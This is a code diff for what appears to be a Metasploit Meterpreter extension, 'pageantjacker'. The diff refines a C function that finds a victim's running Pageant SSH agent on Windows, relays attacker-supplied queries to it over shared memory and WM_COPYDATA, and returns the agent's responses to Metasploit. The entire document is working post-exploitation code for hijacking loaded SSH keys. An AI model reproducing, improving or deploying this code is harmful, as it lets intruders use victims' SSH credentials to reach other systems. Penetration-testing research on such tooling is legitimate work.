@@ -23,20 +23,40 @@ Command customCommands[] =
 DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 {
 	Packet *response = packet_create_response(packet);
-	Byte *raw_data_in, *raw_data_out;
-	DWORD raw_data_size_in, raw_data_size_out;
+	DWORD raw_data_size_in;
+	Byte *raw_data_in;
 	PAGEANTQUERYRESULTS results;
 
-	raw_data_size_out = 8192;
 	/* dprintf */
-	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_META_TYPE_UINT);
-	raw_data_in = packet_get_tlv_value_raw(packet, TLV_META_TYPE_RAW);
 
-	//raw_data_out = send_query_to_pageant(raw_data_in, raw_data_size_in);
-	results = send_query_to_pageant(raw_data_in, raw_data_size_in);
+	// Retrieve from metasploit
+	raw_data_size_in = packet_get_tlv_value_uint(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_SIZE_IN);
+	raw_data_in = packet_get_tlv_value_raw(packet, TLV_TYPE_EXTENSION_PAGEANTJACKER_BLOB_IN);
 
-	packet_add_tlv_raw(response, TLV_META_TYPE_RAW, raw_data_out, raw_data_size_out);
+	// Interact with Pageant
+	if (results = send_query_to_pageant(raw_data_in, AGENT_MAX)) {
+
+		// Build the packet based on the respones from the Pageant interaction.
+		packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
+		packet_add_tlv_raw(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_RETURNEDBLOB, results.blob, AGENT_MAX);
+		packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.error_message);	
+
+	} else {
+
+		// This should NEVER happen, because it means that send_query_to_pageant did not return a struct.
+		// However, just handle it by sending a generic error message to metasploit, just to cover us in case
+		// something strange has happened.
+		packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, FALSE);
+		packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, PAGEANTJACKER_ERROR_GENERIC);
+		
+	}
+
+	// Transmit the packet to metasploit
 	packet_transmit_response(ERROR_SUCCESS, remote, response);
+
+	// Free the allocated memory once we are done
+	if (results.blob)
+		free(results.blob);
 
 	return ERROR_SUCCESS;
 }
@@ -47,7 +67,7 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
  */
 DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
 {
-	hMetSrv = remote->hMetSrv;
+	hMetSrv = remote->met_srv;
 
 	command_register_all(customCommands);
 
@@ -65,7 +85,7 @@ DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
 }
 
 PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength) {
-	
+
 	char strPuttyRequest[23];
 	COPYDATASTRUCT pageant_copy_data;
 	unsigned char *filemap_pointer;
@@ -75,49 +95,61 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 
 	// Initialise the result array
 	memset(&ret, 0, sizeof(ret));
+	memset(&strPuttyRequest, 0, sizeof(strPuttyRequest));
 	ret.result = FALSE;
+	ret.error_message = PAGEANTJACKER_ERROR_NOERROR;
 
-	hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME);
+	if (hPageant = FindWindowW(PAGEANT_NAME, PAGEANT_NAME)) {
 
-	// Generate the request string and populate the struct
-	snprintf(&strPuttyRequest, sizeof(strPuttyRequest), "PageantRequest%08x\x00", (unsigned int) GetCurrentThreadId()); // This will always be 23 chars
-	pageant_copy_data.dwData = AGENT_COPYDATA_ID;
-	pageant_copy_data.cbData = sizeof(strPuttyRequest);
-	pageant_copy_data.lpData = &strPuttyRequest;
+		// Generate the request string and populate the struct
+		if (_snprintf_s((char *)&strPuttyRequest, sizeof(strPuttyRequest), _TRUNCATE, "PageantRequest%08x", (unsigned int)GetCurrentThreadId())) { // This will always be 23 chars
+			pageant_copy_data.dwData = AGENT_COPYDATA_ID;
+			pageant_copy_data.cbData = sizeof(strPuttyRequest);
+			pageant_copy_data.lpData = &strPuttyRequest;
 
-	// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
-	// It will overwrite this memory block with the result of the query.
-	filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
-	if (filemap && filemap != INVALID_HANDLE_VALUE) {
-		if (filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {
+			// Pageant effectively communicates with PuTTY using shared memory (in this case, a pagefile backed memory allocation).
+			// It will overwrite this memory block with the result of the query.
+			filemap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, AGENT_MAX, (char *) &strPuttyRequest);
+			if (filemap && filemap != INVALID_HANDLE_VALUE) {
+				if (filemap_pointer = MapViewOfFile(filemap, FILE_MAP_WRITE, 0, 0, 0)) {
 
-			// Copy the request to the memory block that will be passed to Pageant.
-			memcpy(filemap_pointer, query, querylength);
+					// Copy the request to the memory block that will be passed to Pageant.
+					memcpy(filemap_pointer, query, querylength);
 
-			// Send the request message to Pageant.
-			if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {
-				if (ret.blob = malloc(AGENT_MAX)) {
-					memcpy(ret.blob, filemap_pointer, AGENT_MAX);
-					ret.result = TRUE;
-				} else {
-					ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
-				}
+					// Send the request message to Pageant.
+					if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {
+						if (ret.blob = malloc(AGENT_MAX)) {
+							memcpy(ret.blob, filemap_pointer, AGENT_MAX);
+							ret.result = TRUE;
+						} else {
+							ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
+						}
 				
+					} else {
+						// SendMessage failed
+						ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
+					}
+					UnmapViewOfFile(filemap_pointer);
+				} else {
+					// MapViewOfFile failed
+					ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
+				}
+				CloseHandle(filemap);
 			} else {
-				// SendMessage failed
-				ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
+				// CreateFileMapping failed
+				ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
 			}
-			UnmapViewOfFile(filemap_pointer);
 		} else {
-			// MapViewOfFile failed
-			ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
+			// _snprintf_s failed. Note that this should never happen because it could
+			// mean that somehow %08x has lost its meaning. Essentially though this is
+			// here to guard against buffer overflows.
+			ret.error_message = PAGEANTJACKER_ERROR_REQSTRINGBUILD;
 		}
-		CloseHandle(filemap);
-	} else {
-		// CreateFileMapping failed
-		ret.error_message = PAGEANTJACKER_ERROR_CREATEFILEMAPPING;
-	}
 
+	} else {
+		// Could not get a handle to Pageant. This probably means that it is not running.
+		ret.error_message = PAGEANTJACKER_ERROR_NOTFOUND;
+	}
 	return ret;
 }
 
